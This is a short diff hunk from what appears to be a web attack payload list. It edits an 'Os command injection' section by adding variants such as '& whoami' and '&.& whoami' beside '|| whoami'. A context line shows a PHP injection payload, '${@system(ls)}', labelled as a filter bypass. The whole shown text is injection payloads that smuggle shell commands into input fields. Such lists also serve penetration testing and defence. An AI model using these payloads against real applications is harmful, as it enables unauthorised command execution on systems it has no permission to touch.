@@ -126,7 +126,8 @@ ${@system(ls)} //filter bypass
 
 ----------------------------------------------
 #Os command injection
-&whoami
+& whoami
+&.& whoami
 || whoami
 
 
